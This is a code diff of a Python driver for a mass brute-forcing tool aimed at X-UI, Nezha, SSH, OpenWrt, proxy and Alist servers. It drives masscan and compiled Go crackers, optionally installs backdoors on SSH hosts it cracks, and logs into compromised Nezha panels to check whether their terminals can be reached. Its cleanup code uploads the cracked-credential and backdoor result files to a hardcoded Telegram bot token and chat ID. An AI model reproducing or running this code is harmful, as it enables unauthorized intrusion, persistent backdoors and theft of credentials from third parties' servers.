+        mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
+        prefix = mode_map.get(TEMPLATE_MODE, "result")
+
+        final_txt_file = f"{prefix}-{time_str}.txt"
+        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+        
+        if os.path.exists("xui.txt"):
+            os.rename("xui.txt", final_txt_file)
+            run_ipcx(final_txt_file, final_xlsx_file)
+
+        # ==================== 在这里添加哪吒面板分析与Excel更新逻辑 ====================
+        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
+            print("\n--- 开始对成功的哪吒面板进行深度分析... ---")
+            with open(final_txt_file, 'r', encoding='utf-8') as f:
+                results = [line.strip() for line in f if line.strip()]
+            
+            nezha_analysis_data = {} # 用于存储分析结果
+            
+            for result_line in tqdm(results, desc="分析哪吒面板", unit="panel"):
+                parts = result_line.split()
+                if len(parts) < 3: continue
                 
-                import psutil
-                import requests
-                import yaml
-                from openpyxl import Workbook, load_workbook
-                from tqdm import tqdm
-
-                adjust_oom_score()
-                check_and_manage_swap()
-
-                os.makedirs(TEMP_PART_DIR, exist_ok=True)
-                os.makedirs(TEMP_XUI_DIR, exist_ok=True)
-                os.makedirs(TEMP_HMSUCCESS_DIR, exist_ok=True)
-                os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
-
-                params = {}
-                AUTH_MODE = 0
-
-                if TEMPLATE_MODE == 6: # SSH 模式
-                    choice = input("是否在SSH爆破成功后自动安装后门？(y/N)：").strip().lower()
-                    if choice == 'y':
-                        params['install_backdoor'] = True
-                        if not os.path.exists("后门命令.txt"):
-                            print("❌ 未找到 后门命令.txt，已中止。")
-                            sys.exit(1)
-                        with open("后门命令.txt", 'r', encoding='utf-8', errors='ignore') as f:
-                            params['custom_cmds'] = [line.strip() for line in f if line.strip()]
-                    else:
-                        params['install_backdoor'] = False
-                        params['custom_cmds'] = []
+                ip_port, username, password = parts[0], parts[1], parts[2]
                 
-                if TEMPLATE_MODE in [9, 10, 11]: # 代理模式
-                    print("\n请选择代理凭据模式：")
-                    print("1. 无凭据 (扫描开放代理)")
-                    print("2. 独立字典 (使用 username.txt 和 password.txt)")
-                    print("3. 组合凭据 (使用 credentials.txt, 格式 user:pass)")
-                    while True:
-                        auth_choice = input("输入 1, 2, 或 3 (默认 1): ").strip()
-                        if auth_choice in ["", "1"]: AUTH_MODE = 1; break
-                        elif auth_choice == "2": AUTH_MODE = 2; break
-                        elif auth_choice == "3": AUTH_MODE = 3; break
-                        else: print("输入无效。")
+                # 尝试HTTP和HTTPS
+                for protocol in ["http", "https"]:
+                    base_url = f"{protocol}://{ip_port}"
+                    session = requests.Session()
                     
-                    if TEMPLATE_MODE == 9: params['proxy_type'] = "socks5"
-                    elif TEMPLATE_MODE == 10: params['proxy_type'] = "http"
-                    elif TEMPLATE_MODE == 11: params['proxy_type'] = "https"
+                    # 登录
+                    login_url = base_url + "/api/v1/login"
+                    payload = {"username": username, "password": password}
+                    try:
+                        # 禁用SSL警告
+                        requests.packages.urllib3.disable_warnings()
+                        res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
+                        if res.status_code == 200 and res.json().get("success"):
+                            has_agents, terminal_accessible, total_servers = check_for_agents_and_terminal(session, base_url)
+                            
+                            terminal_status_str = "畅通" if terminal_accessible else "不通"
+                            nezha_analysis_data[result_line] = (total_servers, terminal_status_str)
+                            
+                            print(f"\n[分析成功] {base_url} | 服务器: {total_servers} | 终端: {terminal_status_str}")
+                            break 
+                    except Exception:
+                        if protocol == "https":
+                           nezha_analysis_data[result_line] = ("登录失败", "未知")
+            
+            # 将分析结果写入Excel
+            if nezha_analysis_data:
+                update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
 
-                print("\n=== 爆破一键启动 ===")
-                input_file = input_filename_with_default("请输入源文件名", "1.txt")
-                if not os.path.exists(input_file):
-                        print(f"❌ 错误: 文件 '{input_file}' 不存在。")
-                        sys.exit(1)
+        # 仅在SSH模式下合并后门结果
+        if TEMPLATE_MODE == 6:
+            merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
+            merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
+            if os.path.exists("hmsuccess.txt"):
+                os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
+            if os.path.exists("hmfail.txt"):
+                os.rename("hmfail.txt", f"后门失败-{time_str}.txt")
 
-                with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
-                    total_ips = sum(1 for line in f if line.strip())
-                print(f"--- 总计 {total_ips} 个目标 ---")
+    except KeyboardInterrupt:
+            print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
+            interrupted = True
+    except SystemExit:
+            print(f"\\n脚本因环境问题中止。")
+    except EOFError:
+            print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
+            interrupted = True
+    finally:
+            clean_temp_files(TEMPLATE_MODE)
+            end = time.time()
+            cost = int(end - start)
+            
+            vps_ip, vps_country = get_vps_info()
+            nezha_server = get_nezha_server()
 
-                lines_per_file = input_with_default("每个小文件行数", 5000)
-                sleep_seconds = input_with_default("爆破完休息秒数", 2)
-                
-                total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
-                recommended_threads = int((total_memory_mb * 0.7) / 2.5)
-                if recommended_threads < 50: recommended_threads = 50
-                params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
+            if interrupted:
+                    print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
+            else:
+                    print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
 
-                params['timeout'] = input_with_default("超时时间(秒)", 3)
-                masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
-                
-                params['usernames'], params['passwords'], params['credentials'] = load_credentials(TEMPLATE_MODE, AUTH_MODE)
-                params['auth_mode'] = AUTH_MODE
+            def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A"):
+                    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
+                            print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
+                            return
 
-                template_map = {
-                    1: (generate_xui_go, {}),
-                    2: (generate_xui_go_template2, {}),
-                    6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
-                    7: (generate_xui_go_template7, {}),
-                    8: (generate_xui_go_template8, {}),
-                    9: (generate_proxy_go, {'proxy_type': 'socks5'}),
-                    10: (generate_proxy_go, {'proxy_type': 'http'}),
-                    11: (generate_proxy_go, {'proxy_type': 'https'}),
-                    12: (generate_alist_go, {}),
-                }
+                    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                    caption_text = f"VPS: {vps_ip} ({vps_country})\\n"
+                    if nezha_server != "N/A":
+                        caption_text += f"哪吒Server: {nezha_server}\\n"
+                    caption_text += f"任务结果: {os.path.basename(file_path)}"
+                    
+                    with open(file_path, "rb") as f:
+                            files = {'document': f}
+                            data = {'chat_id': chat_id, 'caption': caption_text}
+                            try:
+                                    response = requests.post(url, data=data, files=files, timeout=60)
+                                    if response.status_code == 200:
+                                            print(f"✅ 文件 {file_path} 已发送到 Telegram")
+                                    else:
+                                            print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
+                            except Exception as e:
+                                    print(f"❌ 发送到 TG 失败：{e}")
 
-                gen_func, extra_args = template_map[TEMPLATE_MODE]
-                final_params = {**params, **extra_args}
-                gen_func(**final_params)
-                
-                executable = compile_go_program()
-                generate_ipcx_py()
-                split_file(input_file, lines_per_file)
-                run_xui_for_parts(sleep_seconds, executable, total_ips, params['semaphore_size'])
-                
-                merge_xui_files()
-                
-                initial_results_file = "xui.txt"
-                if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
-                    newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
-                    if newly_found_results:
-                        print(f"--- 扩展扫描完成，共新增 {len(newly_found_results)} 个结果。正在合并... ---")
-                        with open(initial_results_file, 'a', encoding='utf-8') as f:
-                            for result in sorted(list(newly_found_results)):
-                                f.write(result + '\n')
-                        
-                        with open(initial_results_file, 'r', encoding='utf-8') as f:
-                            unique_lines = sorted(list(set(f.readlines())))
-                        with open(initial_results_file, 'w', encoding='utf-8') as f:
-                            f.writelines(unique_lines)
+            BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
+            CHAT_ID = "7697235358"
 
-                        print("--- 结果合并去重完成。 ---")
-
-                merge_result_files("hmsuccess", "hmsuccess.txt", TEMP_HMSUCCESS_DIR)
-                merge_result_files("hmfail", "hmfail.txt", TEMP_HMFAIL_DIR)
-                
-                mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
-                prefix = mode_map.get(TEMPLATE_MODE, "result")
-
+            if BOT_TOKEN and CHAT_ID:
+                files_to_send = []
                 final_txt_file = f"{prefix}-{time_str}.txt"
                 final_xlsx_file = f"{prefix}-{time_str}.xlsx"
+
+                if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
+                if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
                 
-                if os.path.exists("xui.txt"):
-                    os.rename("xui.txt", final_txt_file)
-                    run_ipcx(final_txt_file, final_xlsx_file)
-                
-                if os.path.exists("hmsuccess.txt"):
-                    os.rename("hmsuccess.txt", f"后门成功-{time_str}.txt")
-                if os.path.exists("hmfail.txt"):
-                    os.rename("hmfail.txt", f"后门失败-{time_str}.txt")
-
-        except KeyboardInterrupt:
-                print("\\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
-                interrupted = True
-        except SystemExit:
-                print(f"\\n脚本因环境问题中止。")
-        except EOFError:
-                print("\\n❌ 错误：无法读取用户输入。请在交互式终端(TTY)中运行此脚本。")
-                interrupted = True
-        finally:
-                clean_temp_files()
-                end = time.time()
-                cost = int(end - start)
-                
-                vps_ip, vps_country = get_vps_info()
-                nezha_server = get_nezha_server()
-
-                if interrupted:
-                        print(f"\\n=== 脚本已被中断，中止前共运行 {cost // 60} 分 {cost % 60} 秒 ===")
-                else:
-                        print(f"\\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
-
-                def send_to_telegram(file_path, bot_token, chat_id, vps_ip="N/A", vps_country="N/A", nezha_server="N/A"):
-                        if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
-                                print(f"⚠️ Telegram 上传跳过：文件 {file_path} 不存在或为空")
-                                return
-
-                        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-                        caption_text = f"VPS: {vps_ip} ({vps_country})\\n"
-                        if nezha_server != "N/A":
-                            caption_text += f"哪吒Server: {nezha_server}\\n"
-                        caption_text += f"任务结果: {os.path.basename(file_path)}"
-                        
-                        with open(file_path, "rb") as f:
-                                files = {'document': f}
-                                data = {'chat_id': chat_id, 'caption': caption_text}
-                                try:
-                                        response = requests.post(url, data=data, files=files, timeout=60)
-                                        if response.status_code == 200:
-                                                print(f"✅ 文件 {file_path} 已发送到 Telegram")
-                                        else:
-                                                print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
-                                except Exception as e:
-                                        print(f"❌ 发送到 TG 失败：{e}")
-
-                BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
-                CHAT_ID = "7697235358"
-
-                if BOT_TOKEN and CHAT_ID:
-                    files_to_send = []
-                    final_txt_file = f"{prefix}-{time_str}.txt"
-                    final_xlsx_file = f"{prefix}-{time_str}.xlsx"
-
-                    if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
-                    if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
-                    
+                if TEMPLATE_MODE == 6:
                     success_file = f"后门成功-{time_str}.txt"
                     fail_file    = f"后门失败-{time_str}.txt"
                     if os.path.exists(success_file): files_to_send.append(success_file)
                     if os.path.exists(fail_file): files_to_send.append(fail_file)
 
-                    for f in files_to_send:
-                        print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
-                        send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server)
+                for f in files_to_send:
+                    print(f"\\n📤 正在将 {f} 上传至 Telegram ...")
+                    send_to_telegram(f, BOT_TOKEN, CHAT_ID, vps_ip, vps_country, nezha_server)
